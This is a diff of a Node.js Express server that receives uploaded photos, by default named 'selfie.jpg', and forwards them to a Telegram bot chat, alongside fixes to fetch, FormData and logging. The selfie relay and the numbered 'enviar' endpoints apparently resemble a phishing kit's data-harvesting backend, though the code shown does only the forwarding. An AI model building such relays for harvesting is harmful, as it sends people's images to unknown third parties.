@@ -1,6 +1,6 @@
 const express = require('express');
 const cors = require('cors');
-const fetch = require('node-fetch');
+const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
 const fs = require('fs');
 require('dotenv').config();
 const app = express();
@@ -200,15 +200,15 @@ app.post('/enviar-foto', async (req, res) => {
 
         console.log('✅ Foto recibida:', photo.name, 'Tamaño:', photo.size, 'bytes');
 
-        // Convertir el buffer a Blob-like para Telegram
+        // Usar FormData nativo de Node.js (funciona perfecto en Node 18+)
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
         formData.append('caption', caption);
         formData.append('parse_mode', 'HTML');
-        formData.append('photo', photo.data, {
-            filename: photo.name || 'selfie.jpg',
-            contentType: photo.mimetype || 'image/jpeg'
-        });
+
+        // Crear un Blob a partir del buffer
+        const blob = new Blob([photo.data], { type: photo.mimetype || 'image/jpeg' });
+        formData.append('photo', blob, photo.name || 'selfie.jpg');
 
         const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
             method: 'POST',
@@ -220,16 +220,15 @@ app.post('/enviar-foto', async (req, res) => {
         if (result.ok) {
             console.log('✅ Foto enviada correctamente a Telegram');
         } else {
-            console.log('❌ Error de Telegram:', result);
+            console.log('❌ Error de Telegram:', JSON.stringify(result));
         }
 
         res.sendStatus(200);
     } catch (error) {
-        console.error('🔥 Error crítico en /enviar-foto:', error);
+        console.error('🔥 Error crítico en /enviar-foto:', error.message);
         res.sendStatus(500);
     }
 });
-
 
 
 // Otros endpoints similares (agrega /enviar4, /enviar3e, etc. si los necesitas, sin preguntas)
